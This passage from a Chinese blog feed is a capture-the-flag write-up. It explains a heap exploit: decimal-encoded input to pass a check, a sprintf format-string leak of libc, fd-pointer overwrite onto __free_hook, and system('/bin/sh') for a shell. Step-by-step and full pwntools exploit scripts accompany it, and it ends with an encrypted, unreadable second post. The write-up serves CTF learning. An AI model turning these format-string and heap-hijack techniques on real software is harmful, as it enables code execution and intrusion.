class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++]\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;10001000&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line">             </span><br></pre></td></tr></table></figure>

<p>可是运行一下发现，if的检查没有过去，出现了死循环。把第四行注释取消调试一下。</p>
<p><img src="/../img/2706180-20220514181236179-1811812982.png"></p>
<p>发现此时来到了if判断的地方，然后我们查看一下$rbp-0x24的值，发现末尾的是个什么玩意？989A68？ 这个肯定是过不了判断的。回想起现在看的是个十六进制的数字，我们用计算器转一下十进制看看。</p>
<p><img src="/../img/2706180-20220514181247254-599152087.png"></p>
<p>豁然开朗，<strong>因为我们输入的是十进制类型的数据，但是最后宏来取某个字节进行判断的时候，是对十六进制的数据进行操作的</strong>。因此为了绕过判断，我们要用十六进制的数据绕过，然后把其转换成十进制的数据输入。因此我们应该把10001000这个值改成a001000（a代表第四字节（我从低地址开始数的）设置成10为了执行malloc，第三字节的00，无所谓只要能绕过最开始的检查即可，第二字节的10代表的是malloc申请chunk的大小，第一字节的00相当于是unk_202060的索引，用来找到不同的堆块），然后转换成十进制输入。</p>
<p>所以最后的发送应该是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.sendline(<span class="string">&#x27;167776256&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>目前我们已经掌握了绕过if的方法，接下来就是调试来布局了。首先我们要溢出，不过在此之前我们肯定是要申请两个堆块，然后free掉后申请的那个堆块，去执行memcpy来修改free掉堆块的fd指针，再malloc回来。</p>
<p>值得一提的是，memcpy复制的内容是在这里输入的，我们应该提前在这里布局一下。</p>
<p><img src="/../img/2706180-20220514180301736-97569248.png" alt="image-20220514100958393"></p>
<h3 id="sprintf的格式化字符串漏洞"><a href="#sprintf的格式化字符串漏洞" class="headerlink" title="sprintf的格式化字符串漏洞"></a>sprintf的格式化字符串漏洞</h3><p>我们要将fd指针修改为__free_hook的地址，获取这个地址的前提是拿到libc基地址。此时就要用到前面的格式化字符串漏洞了，先看一下sprintf函数的执行情况。</p>
<p><img src="/../img/2706180-20220514180302267-1280701485.png" alt="image-20220514101654530"></p>
<p>发现偏移15的地方存在__libc_start_main函数地址。不过由于这是sprintf函数，它的参数format存在rsi寄存器上，rdi已经被第一个参数占了，再填数据时是从rsi开始，跳过了rdi寄存器。因此是20（15+5）</p>
<p>此处接收libc基地址的payload为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.send(<span class="string">&#x27;%20$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">leak_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak_addr-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">libc_base=leak_addr-<span class="number">0x21c87</span><span class="comment">#0x21c87是泄露的地址与libc基地址的偏移</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>

<p>然后就可以获取__free_hook的地址了，我们将其布置在这个地方</p>
<p><img src="/../img/2706180-20220514180301736-97569248.png" alt="image-20220514100958393"></p>
<p>此时我们利用溢出将free掉的chunk的fd指针改成了__free_hook的地址，同时可以看见bins中已经出现了__free_hook的地址（如下图）</p>
<p><img src="/../img/2706180-20220514182802712-1937798255.png"></p>
<p>此时的payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *$rebase(0xec6)\nc&#x27;</span>)<span class="comment">#ec6</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;first,tell me your name.\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;%20$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">leak_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak_addr-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">libc_base=leak_addr-<span class="number">0x21c87</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">fake_chunk1=p64(<span class="number">0</span>)*<span class="number">4</span>+p64(free_hook)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system_addr))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;How many pieces of data?\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.send(fake_chunk1)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++]\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;167776256&#x27;</span>)<span class="comment">#malloc(0)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;167776257&#x27;</span>)<span class="comment">#malloc(1)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;201326593&#x27;</span>)<span class="comment">#free(1)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;184549376&#x27;</span>)<span class="comment">#memcpy(0)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>然后我们只需要两次malloc，就可以申请到一个位置在__free_hook地址上的堆块。</p>
<p>接着我们用memcpy函数把system的地址写在__free_hook堆块里（效果如下），此时__free_hook指向的就是system了。</p>
<p><img src="/../img/2706180-20220514181316800-65373104.png"></p>
<p><img src="/../img/2706180-20220514180301381-730330410.png" alt="image-20220514154108694"></p>
<p>最后我们要free掉一个chunk，这个chunk里面装的都有什么不重要，只需要让这个chunk的地址去指向&#x2F;bin&#x2F;sh这个字符串即可（是指向的字符串，而非字符串的地址，因为system需要的是一个指向&#x2F;bin&#x2F;sh的地址，chunk的地址已经是一个指针了，我们并不需要再传一个指针，只需要写入字符串&#x2F;bin&#x2F;sh即可）</p>
<p><img src="/../img/2706180-20220514180300891-657482779.png" alt="image-20220514155318872"></p>
<p>最后执行free即可获取shell。</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *$rebase(0xec6)\nc&#x27;</span>)<span class="comment">#ec6</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;first,tell me your name.\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;%20$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">leak_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak_addr-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">libc_base=leak_addr-<span class="number">0x21c87</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">fake_chunk1=<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(free_hook)</span><br><span class="line">fake_chunk2=p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;How many pieces of data?\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.send(fake_chunk1)</span><br><span class="line">p.send(fake_chunk2)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++]\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;167776256&#x27;</span>)<span class="comment">#malloc(0)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;167776257&#x27;</span>)<span class="comment">#malloc(1)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;201326593&#x27;</span>)<span class="comment">#free(1)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;184549376&#x27;</span>)<span class="comment">#memcpy(0)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;167776257&#x27;</span>)<span class="comment">#malloc(1)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;167776258&#x27;</span>)<span class="comment">#malloc(2)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;184614914&#x27;</span>)<span class="comment">#memcpy(2)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;201326592&#x27;</span>)<span class="comment">#free(0)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>赛题WP</category>
      </categories>
      <tags>
        <tag>格式化字符串漏洞</tag>
        <tag>堆溢出</tag>
        <tag>劫持free_hook</tag>
        <tag>ida新建结构体</tag>
      </tags>
  </entry>
  <entry>
    <title>程序实现单链表上的一个漏洞</title>
    <url>/posts/378831b9.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="64ad29b965289bd93383cf12d930b5616d483fe18bdd79fa0110cd0369df2de9">0e96a196e04ab582d32680aaeaf05fdcdf197277fa4468e51c98a6189f8f162162cc8cda35bb8442d3ced35bab02c59a0869a8472f83cec4d4675d54a25b767b0483f19c3dea62baafd7f856007691638970fa7e481f5875f765f81d977b55ca3ba737f24e6996e190bc521ef6d4085efb86125f0f5a4294bcc01b231e7e322002abb294aa592404ad1c1eca241f4c878f9b6e1ab280ef16140f812d4c76cab61d8cd44afd45e90cee026e159642469aeac7b03146c77c1f103270b97f7043a5c0339d106e7ce0591bb39d20d8edf768dfc50ae9ba9102f19ae8ca3ca4668d7ee5b38df036432e4d52b23a0bdbdb65ba40b08912f936ebfc789ac487e9096b666ad306189fb7698dcd90ae0adf29d2bffe8394591a6e196022c019878b6cd7e1777aa10b1bb67bba0cb1c1549ee8903862531357e54b77afb2f0a45bdf84437421a75f9c2c81321936403737e4fe78ca9d47a705208db71e06805dcf4c40f133f230a9f4e6088abf3cb14b9a1f13006e5b36d428443d0cd864243d6ab32dcdf922cbb3c61f4a2c133165c9b68610280faa86cf66ba3ebb615697c8bf599694355ca3cce0f2f5778041f8b9cb9545e07018e5e2c65024a9a7a5f4d015447eccd55055f853a6f4e424f3899a28ea3e2afdd5aa3bbab3e83af93a259297fcfa033f9eec4a0c80744d96d9078c6a3c5ba79cf98a265bc35e44ac2db2c3857adb395a7d9aaaef025c2205024414b221887105f9a6e7659ff67992a96abb7d3701af1e9bb9ea956f836c9ead5f84ee3a15701656f8ac4542407becd284daaebde72716c0a7988fe1c48e30546acea5030fd47f18df00a856f516dee1e905b40f4ed7988beeffeb63b6c079f436a83c7b28c752a844d4ad38ad2db2b1dd7b492f43e2f1b28382529cbc631b4a565587a3eda7fdd385728201a95f93ba96b8be62ea1bd7c052c86d8481deaedde83090267036e8adbf84a9087f732ce6e62f360fc42502c1930ded848649ff1a8d5c30e972e1002f1e8ffb038e380829a6400b6bd28d89557baec19c3d42652f79e8731e1406476adbcba5510305816a47e3bcbac938f7e679f09320b6820d4bac4bce1db3d17a93e8443ea72afb4d82dd42bf336559888936357d88c3663f283e6c8569eaa87d2a8a71786913150db9b07c06bedd9a467d158e05c0008044fc2fc8ca1fae3ef00caef6eaf735d85396c9448b063a1f99cf56e20257d60c4ca806bd84465f98a897790c2dbf57a8d8e483cf1e2a58fc88418dd3625cc91b23403aaaa25c8f9bc7e94ad65cde149cda1bd23ad0c57e138aaedbea15d9afcdb5dd63a6d4ff146bdcdbe2f9fa7af64247e2e8df479ad21904fd476ad6c8990e6085985612a15a610934d221ddb824ea46244f2a61a86e1748613ac7ded604c2a01ff11cd1ecb2d49f719647d215818f51249aa89138ea6b8b0146390e44a603ceb3ef57630a1e0247ee43ff2af05bbf33cca5577616e5b6e84a9c5bca79a0b91ddbeb9b7716f2f41516bb9b6924004d828eca3c8e97180e1188132da0f0b5f8985ef7e0eae114651398d2a6a4866cc39c0c48ee3cfdcc18b0b19e2f9f754bff5ff82992e28912f279bad07a2cf4d3321c3383402f4a02c08872a15418a076803da35a508a928746bdc75409d46094dc3bc023b69c5c9911b6d4ecca0e28d83116337607216a0eda2866629d84f49770a5444b0f01cd7cc5c898a685fb10b09416ee38cc9763f7ea3c51ea7a60647381df85b294b3dbd7b4c5b43f1ce28222cbccc8ca0029ba4f69609e0cee59cf229c4455d3d5aecf2938905ca29e7253011a306595fcc22e044a99d3e2571622af160b7970d7e53a6193ba71f4ac26208f359357d9cf263184d4ba9a38b793fd23a2107afee1425000ee5219a9ae308078b088c3bedf021a978805ff030f65e625ee249b9173e017c999bb38ded9d9405ae3ae58a84e401dde719a43f9b0af7d58c0483183163e4aadb23ccf381eaf0ffbfc2af339691ab3889d4943a8e9a8a5c64178c3e0bbfce0e990257009e6a6c6b82cd2ed8eefac46b306529b06bf946bfec28defd0f7c6315bc48565715c1b96e280b9eedc0f0a58e24894f698b682815280f53e76de2068bcfb4a9dcfec1f0ca5dad4137fb4769823e6ed80efa5df9fd0202c434f5f98d249b079c2841cf58e280a3e8ece97b6089c1efb2b62015de7f85b7a1190af402001109f42f416f18cd755278ed895cb63068042e5ec31fb4fe3779a382e5a52229ee1a1f74dcd179da11761fe717eaea45be219eeea945d340056fb6cccb312621c0f0437beb6592b464d4897180e8544af99852b40482fbcb432fab9c4bd6a7e465a62320e196c34242a2a935d0a6d93d87262fbfe376c28e79d4ae94fa3c419e12383328e263c361fd652883ff211df6c89ed9bc495c7efadf9ba94cba1cc0c5e9fea9fdce344d7d3fadced61d5fd5554d3aece46ddaee31b110e6c765a47da00be9c3766e42c10f78007eb0c8d0c5d4f5dd9b1a01fb57b886314ca83a61955d23bf4f322d5befd6f50742c2fbfc51c8364307b3af8f0635f132090952f39064de10ffec0875ea8ff5ae0be104c4f81fc721d537e4fa0daddc365ef12f0559c954f8019a2bdfcc0a6636420529ea0ce72b906cb21103073c8c41a545b658969660c26116d793d6c4423b150d97dffb2af6013ab30389af6dae8a4362077c7b45a60e02fe117286c0f519ddf106032d07852990d8ad13b9b64766545ceaa9d39428ddf742ce09c13662169ca977b1c8121ff6646aca29db55c60d38de812d6c9b57160da1ef8044d6b52dcecc64bb7d3f4305a1563d25962bdd7c8624a0db652b6670b7010459a22d107b4c5ac64e720f7b0c3f048fa432b5ff324dfefca86ab8f520c26fc2977928f6986fb2484551a0f0e92ea7dabbf9d9d291b166eb46f6fa6a0243bdd5f4d53a839af89659ace0f0528692e726b40c11f9932286591dbbae2c7d0f34d7ef52041efa39d140ed6da8238c2948e3f30153b9db9bb4fb2de1df2b0b28d73493fe7a7e0b77ba0d2f45cb933c755cecb7c97f3c9646478873a4845e2cefd02db3587dbc8d9268efb27b12fdc210a80c2f3fe097423001a9edbaf589230b714f5b1473fac435c04d5ce10cbf457cad690dcd7a812cc35e9c8378ace4193ec1119061657475ce309fb3788085a1a853bae2ee4e68e2e82685315f460a05b97dff10fd0b793252f8355e8b67435f8485c93ff8daa2b831ddd10a909f50f1f6a9308b76064a3874901b2a549df73cee9afd649d9682c5705f07d6e6fc532ee02f9f460f16c3c500e139fdaf2c0cff27efffdeb1d7baac3de389c5c59cfec6254360c9953cc07d4c023cba4a766cc30a04e2f48e2382a42aa0c381baf481520d4d4bddc252cec8d60c8f047c225e3acd0daf37370b5617cae82e3e8c0904a78f0643aae6abf771ded54763f16829af7405176e4a4203f0eebcb8e31bf47eeedbb048bd90f26d2ff7b2c712ca3eeec665e97c91a39c87b68aec084e5e6a89608821e7b3edded6f8638a76b289709071af03b4069fb89affd3fdd07264cfd0e6f0bbf4a167e9d109e716e91a142f8acb4fa162802597e1914db27751d897a68cb0e31e7e7a3dd459dfcc3399ddd6e7337d1ad7fa8a00a146f72cb172caa38c322d1f91df58f809620230dee4b8d33087e5697668e8d6948c19278878111222965071ff547bc69d83067771ffedad0899254c1a4809800797af93ef9772f1003127dd0294d99188ebfc86cc4862a7403024e0e6ada5eacff7793e1da63567749a0232db357d6287860e809f09ae541f945fcc3464fa423c4dc69bf7fb58a7232ff84c62f002ada9272b36d2dc91c1bcd8679452b7650f016ada98fff87ff2bab624d4dcffcddb4cf561ff5f1cad1dddd32dd7286fe98b9461ee89aa1603220dd83e196968637bb183a6c1b4fafe84969d3c1f11ac5b5130bd47f1dc366ad5a524f3f8d680f3593e37a760702de7f66fea038477a17b24796b8a1126d0a8435b371c20cac11b3a560857f8d9190546da89fa93b70a83bedd24bddd2b670c8f036533b3c28db71c0e104aa523e17a590df68a50e81bf82763e97ac1319d42f464cb50e4b74246d1bcc5320be7b952c7dc468436d27f78f2999291bd7ad9d46325f2d28719600117680e3c1bde518f36b5ca3e712071b36f320b145d625c1a0994d1a31a522a549a20d87c35cb2ff7d2d1c862f679a1811ab8aa072d388df20351fed2fa80f4cf70db8982e99a2152262abb41b63fc1f12cf6460583514d96aa8eaf43f1685b2d95d489758da106f0b973fa5bb50f179358acce0eac4ee39f8df59ff9112a3b292f4edeaad02350758fd78423d043bf7d9be13e9dd5e52bb2f79b2667f0aa233529e9e5ed680b7b67e85351436b56828c8edff0f5d4556738e9f8dd85247276f48d273741d0c5b1d845dff1b84bd2688185c8a56bf2a873d9c9729c98addc5a7ee5ef7c41fc9e0c71f8396bc488d90e400f24e129aa04cd1d7beb65782117d5485a4e1e89d02b6e9340dc8ae4abf5234dd788a483c40bb15cad8d44e678c1248ca002a7c33414ca4b7ce9d0aaed8ab42fe7de55420521fbfabd3c25403659057d46beb31839043e2845ea6c3413423afd3363fa1b312d2b1f91c27deda586d57c535cc784faf62c70318e4c57c321d0482175b5b2326212a981ad55b677a544145a88714d83f8042800b0554a3ae555d63ddea44429cdf517a01a3c34532a5871920d204fd78daee4d7b8ee03d6c89cb8afa5b959d7e4254c6012238e8e375a48ef5734b67182c40f2522224bd3101a9f0c9e1fd573b3a63bc243566f431f4f8f1c76dd8e38c272d7e05078a6056f045725ff9fd45e3ece993e367dadd0f318ed8453cae6510b56227756da3d0f8c4a4605d185f50be532d4876571dfee0bdb45441e2046022544a217fdf7cfc835e6ca7bc914b97017cf089fb7ed3a51a653f9dd1ea25b59385890c47dbea749ed87e8d4c24263637415a9fdfde59431973e4e04362aa15eb5e0a28fcf610d97e8ca45b9987f0b07c86d09d10021e2c4ea10ec072a128bf020ef75990f9deccddcdf908729e36efcecf8d0a15b1a80550cd6eee2d4117dda0b14e048cdd6f853ec3b323323cd44511a775ba263540e30c091af96daf71fe69db0d06f7cd5a264aced141817a9db02a8decbdcfe9b6d6eeca1a1143f0392fae4371604fba092170543a65a6bccc60d072d275ec3cd17ff1983a06f2a14e33638fcdffc80bbb50300e80b862b916660d533fccfbd6127f130912750bcfab910a9634f921926ca989c9e5fae8ad04fdd4832c565b4164d1b07329407b1c9346b49558b680a32a4abc546e2ad40eba76369b422e464fa1a84b398d92da329d6370292f5c0673137ae180549842797ddb9114798119aa7a16897894fab027115a9cf83cb057dbdd60324be8f926c84ca209d5c5fe80908598e51f2f59208d733569df747a0fd705f91a2da0ef546eeba2b43e5b92e7c2b54074a422a7f4a5928e21a3002a24eb807b9c9eadec2e6cd95d273133fb8ccb89452bb3c5be8b1a521846f59594aff69449e65504740e8617bb50bb7d4bce8052e56548b82fa7a9b43db51828bbe40649b17cb0359cfced2297a33ef9c17e8a508506b7da283356933723ecb404b4661c8ebbe12aa117345e30aa48b97d9e310d70f49b158857e3814f326620a829abae365fbf27008f7cd13f419f1834cd9c6d5508224878ad8379782c15eb68a3868dde00a5a6f9667520b5e8cc7f08d343737a13bdb1a2ff34b2c20c5e699cf2a857928f25966f062dc3a43624d42f101d781895d475956743508e1359d68c6680abc09f381ed2339c26dc2f09e46226b36fcde8c264d4bcdf052d720f04ba8878a84397fc08fcb09890c6a7b6342edf0be05e3f2467a1d6c14c84ea9fc53ea0109ecc6644b115fab6b069d7aef8a015328b95360405401e2db1d912929d7d734defef0dee2a47848c2776632ab64037ce73f02d7005a93e7b913f2884c79cf49ce4f7fc8dbe53a53184a6227618b16bb93ad0c20973121cfc8164cfa8aab3eefdba83be9fd5aed840bb32687b95a1f66b3094da173dadda83811f3007f34d3cce0cc2a9f6cd6cc79f99386cfbbf208d6857811d033cfc575d6ad647f5dc2c2ca2674880d4b0b66917a59e1bdbe082d53f44564fe8b668e6814304c9e494f658a7e759816c6b567f861ec9571c212aea701126611d0926a00357d0293018ebfac5915f540a97c5d10708a3d9963be6fc3d9d7ea6345a78313566e3f5e1b8fa4cb3c82d0b13a509b320114e9e18f4919ed89886f70156ff986a20d8429cb7934e1e66010507613fb7d4846c240f3b85805698a14f5d9408b433f2904999ce184bb196dc11fb36a818dac6eea5cdc5d6c2e9c704274dbefb0c640232da3edddd958614a8e1dddf6cbd6373d65a6bbebe6807a4b5569400ea08f435164d919a41c99129ffe7cc8b9239b1cbf357fe7db206a7d9f483a841bcab93a5bf0f322829eb2b0d9f7e6a5da0f385fd2577ad4100516fca7b64fcf43a0e70fee0fe872de5182670b9e864ea049ed50b668a3e9317f000b3bb8551fc62eae31738a5f3db5097f97f15229ebd9826dc43dafdaaa192f0490a8b021d024ad14fc1108d9cccd88161882fdc28604d73debfa681154abcc68898b1953747cd7c862ebd29b34de98415c5193ffab796fd29415e27998d21597354b13459f07d66d501c24fc62bdfed50a5bdce0b7d21bb2a9b2d38dbafb370e3bacff2bb65b7b845dd9396ace26451b5d56fd6ee16065c57f8d5df09c907d46db39eb1654873dc56e46333db0ccb6810d9dbc909b203f0a398b7897a34f288fb162e6d1e0e07ba6eeeaeead9351ef75fc77e360ca4bf8bf269a2b083aee65828647a2ab70e32ab1b70d4142dfd99c8767055a721c7bfe44d6258fe428cc6091f0a77b4f132c152100334ef9ae90c408389f94fb84feaf9be2da80a4677350fd5b7d19f268023a6b6337048d827f176b7ebcd520d2d6cbee6df0116b0e55c587e26b83a9c350b3b7197d3db41b8fd21fabc692ed75529d8e5bfbc7a67ccb5730161696ad67a8edf06491fb49ce6945bf2d3cde2daf79a4b8c15293567e63e174fd0ba1984282b4f9fda6707558c6e3567c8a739019439fdc2628cc01c905b52ccc2df8ca313bed9083f1b9fdeb1da22e66b4cc88c5cdfbee6dff4990c4a854950a7c97ab1fdd3576a3edefd7242c1f25bf3205ff6db2f2d50e2bf3ec83ce9c11ce53abed27420612356653a7bd19cd3cd701cb2c8147483c81a1e761df9b96c301ae8e08f307d66592f00affcf369bab696623192a967ad4813fbf4087f9bd326a429178a281b3f7b2f502012a8a7d671a61423db323376f13895a040476c7995ef350313e323119c5ea6bcda25587a6895a3999ebab4bea94aa0851ef836d5ba8dc9a0e129434d0e24ca1a7328a6fa780073c763cce96c3b4dc2523f8cbfa8828c270bedda06599aef5e8fb29276447962d854daec032e87d9aabcbfd1e6be2ada28323f25596ff860667ce53d118de7a730459159114aeadbbb2fe96da59df630fdd72b4a480086929a86633d3e695e7c1cb2578d2559a742635d269bfcc3bd45d858e605ca25f4ceb461ccb40a6dff991ff11d6cfa6f9d39b7b6ef154bb77a88bb16e40aab35d201bdc756f203f416a35ee094413b268fb0383c4b573672bcfcaf6ee952d3127b2c810a097f597c3cfa544cc3913db3255046d48ea57c0e33dd9b16ee64c82729d758fbdd0cd0ba1f00ac81f33f8e3ef2a6dabc33f3ad0b1439e2e392380c001d952504849cae369bf3e35f7c7a7e6077bba2c06fde0f9fb97538bbaf3524bb89f7b890729f7ea35aa73e6c5781e2785d4665460840f9d3ef1e222098da43017b5a996897f4bf618ee38ddbfacbdf95315c63cffdbc43c3eacadf1285f938e939bee310dff7dddfaeb99e470b00f8c5b47100800fbd809a6c56e5e82fc8ec012145e062887d63abaae140298d30736cd7b59dea6b223f79be967c70d1bab3c8b4aef29f40b3df7ea9b160f5c72923253fa0a8cb7cf5519a1a36540c8890620769b08157fdb5dd70d74dd6954e54add335f0727d5cbd4ab9da7b66e7cf02c9bb36e1b9dba9af071958f9af058ca3ea6864fe16b55814299ab6a95858381afeb1f343c381933a9521178668b8225a10d2a947b9c69a80904433144a723969503fe0bf5110e4bd6f5c14f38edab0f619a5b06ce7282baa96844541f0c41aec1dc3a97407bdb0ee59ced03738ad6783bf8af5dea18156398c46797696baeb146356a2c9dd5bdc2c9648895868ad514b858a3eb7414c4201abc2d97f498fc66455a0869bf6313356332e9f2e8dcc3bc6fc85e98e068d7e1dc424fd5114989f7d6d6aaa73333249d546001fcb60706ab2c7a188832f25988a00ef2e300c00ac0a9c8f04fcb75c26fda1eda2c42a460eb6a152edd6473ba37224c52f4f4aaa04aaf2fb5b02cb767c71f4e14ae9235c5cf1e2c0cc8ed5d8f6524a494b15a5fe2bea53e21a0b9aae88637552420c4c9a14c6dbac6cf87f515bb85d8bb02cc705bc1951f6dcef21f441014429a4df564b80bfd0e948cbdbca3897993c994c30f05338ec18cbbd6a1d314c513ef71674faa8f0515cd4db7df76e95e55350502782fd7b9a9d1bd66337bdc4b321f49a2d490c7783fb7e8cc7ce2b08327fc1cc2b4214f6c2712620e39f36c551c5433d3f7615dda561d4983bbd677dde044338a47565392e764dc2bf8c60bfc825410803ee0c0e365327215dfb51884a29791a51126cc38f2ef6fef9d8320eb16c83d35dfca94baf06597e2a81b003104c379bf1a78908f163c9034b112e59af18330a9baf64a45c2f7b05bd70e0293f08dd0e734691ceceb4c4a7ec0cdf01ee856461e1b97ea95ad4d61fb7e863c5ad4dcf07ea9ef7ebfcf4d79fd11a683348cd2ec9deb3c1bef490443acfcd1dad8a5f9b7cb44dd00566ae8d027f9210e88be38ce0e470ea5bb69ffee5383da892564494890071fb7cdf52b508198f0acb3c30b30d8824b1bd266bfe616de38e0b6a2e09536f5b7b8be3ae757a54ff746d1e32b55a6ce515a4b796fd5a617a7f847d58d3b3efc04c8607b7fa887e7628f889d122e8c945636000b1d2ebd16afc88b3a108daed1c10be9f55dabb0032dadbbf9d4ed2e28a8fa877eabd9cc573fc10024eee3a30177014983911406170a457a3bd295c2823a066fe63ff1611ee984b436bba3b959aafd3d9f9b5c93270df6d18d883aa887f8c39ea1ec377737fe01e9758fb68f9e661d93839900b10b3c6557f6fe44e5c17814243f999c8050e25ac69a56a9584b90289eea0376d98552e30bdc09364b3fea155879ababd5444f25cecec265262d224d27460448411659685641088a3116c5a793a321bd74266f0d773d01ca0048466b98346fc8bf49eefa98fa068520f1dfd21602c1cf0c4e279c6cbe3414fbf79a6103b2ac297af685a2911f1ea8558195e1cd8f323ea78d5f44f764addfaa3678855e593f951144432d421b079ca5470305abf3ac45d61774e7fcb8452ae52cd3e42f3f7a12ecf447b648c430ba825c2cc4cfebf92c06fac1a646aa37b4cbc8fd30701bb781e3114042d7cc8d592437b226d934ff93295b580a49d1e66be22458eafe8f59e5cebffaef19e159223a964c9f7b1ffea593e32cf111463cb3c0a75eed510d15601ae5cf4671a747734f72d13a1fad75e4f87b993fe2e73fc40e2e6dee6ff5e13f10c4e93c46d5ca8b4eeed094faadefa56a84bc20dcf2b5ee414d446830e7a533ff792769c4ae64a7d5d232179bcd32892c1affb8603e276a2ba1531caa41083062f4fa89559a9ad6fe243ace776d9b7faa6b73cc3e8f5991dd7ab54cea0bf79257554e7e034a5f98d110169195521489c9fcd5331701c125a5d85982303b1dded8ad179a46aeebe29bd2e232930b66b0c8ed454d3e1c4074a86731e9d029143f2bc965b2d0c2081c8aa3d6f7372159cc1083c9cdcc6a37b7fccc13f385bd5ff05bf6ea7fe6a2429679b2f0c868a279bdea1768c771d53a364c2ad3bb